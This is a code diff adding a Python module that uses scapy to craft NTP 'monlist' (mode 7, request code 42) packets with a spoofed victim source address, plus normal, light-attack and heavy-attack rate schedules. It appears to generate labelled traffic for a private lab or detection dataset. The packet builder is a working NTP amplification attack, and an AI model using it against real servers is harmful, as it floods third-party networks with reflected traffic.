@@ -1,0 +1,62 @@
+import numpy as np
+from typing import Self
+from scapy.all import IP, UDP, NTP, Packet
+
+
+class monlist:
+    show = False
+    verbose = False
+    test = False
+    victim_ip = "10.0.8.1"
+    ntp_server_ip = "192.168.130.49"
+
+    def create(self: Self) -> Packet:
+        ip_layer = IP(src=self.victim_ip, dst=self.ntp_server_ip)
+        udp_layer = UDP(dport=123)
+        ntp_control_layer = NTP(mode=7, version=2, implementation=3, request_code=42, data=[])
+        return ip_layer / udp_layer / ntp_control_layer
+
+
+class ntp_ampl_normal(monlist):
+    ref = np.array(
+        [
+            26,
+            26,
+            26,
+            26,
+            26
+        ]
+    )
+    count = list(map(round, ref))
+    interval_seconds = list(120 / ref)
+    duration_seconds = 2 * 60 * len(ref)
+
+
+class ntp_ampl_attack_light(monlist):
+    ref = np.array(
+        [
+            26,
+            1000,
+            3000,
+            3000,
+            3000
+        ]
+    )
+    count = list(map(round, ref))
+    interval_seconds = list(120 / ref)
+    duration_seconds = 2 * 60 * len(ref)
+
+
+class ntp_ampl_attack_heavy(monlist):
+    ref = np.array(
+        [
+            26,
+            1000,
+            10000,
+            10000,
+            10000
+        ]
+    )
+    count = list(map(round, ref))
+    interval_seconds = list(120 / ref)
+    duration_seconds = 2 * 60 * len(ref)
